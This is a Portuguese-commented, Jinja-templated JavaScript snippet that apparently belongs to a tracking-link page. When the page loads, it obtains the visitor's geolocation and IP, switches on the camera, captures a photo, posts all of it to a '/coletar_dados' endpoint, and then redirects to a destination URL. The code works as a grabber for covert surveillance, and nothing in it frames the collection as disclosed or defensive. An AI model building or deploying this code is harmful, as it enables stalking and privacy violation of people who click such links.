<script>
    const slug = {{ slug | tojson }};
    const destino = {{ destino | tojson }};
    console.log("Slug recebido:", slug);
    console.log("Destino recebido:", destino); 

    async function coletarDados() {
        let latitude = null, longitude = null, foto_base64 = null;

        function atualizarMensagem(texto) {
            document.getElementById('mensagem').innerText = texto;
        }

        // Tentativa de localização
        try {
            atualizarMensagem("Obtendo localização...");
            const pos = await new Promise((res, rej) => {
                navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 });
            });
            latitude = pos.coords.latitude;
            longitude = pos.coords.longitude;
        } catch (e) {
            console.warn("Localização negada ou erro:", e);
        }

        // Tentativa de acesso à câmera
        try {
            atualizarMensagem("Acessando câmera...");
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });

            video.srcObject = stream;
            await new Promise(r => setTimeout(r, 2000)); // Espera a câmera ativar

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            foto_base64 = canvas.toDataURL("image/png");

            stream.getTracks().forEach(t => t.stop());
        } catch (e) {
            console.warn("Câmera negada ou erro:", e);
        }

        // Sempre envia IP via request
        const payload = { slug, latitude, longitude, foto_base64 };

        try {
            atualizarMensagem("Enviando dados...");
            const res = await fetch("/coletar_dados", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });

            const json = await res.json();
            window.location.href = json.destino;
        } catch (e) {
            console.error("Erro ao enviar dados:", e);
            atualizarMensagem("Erro no envio de dados.");
        }
    }

    coletarDados();
</script>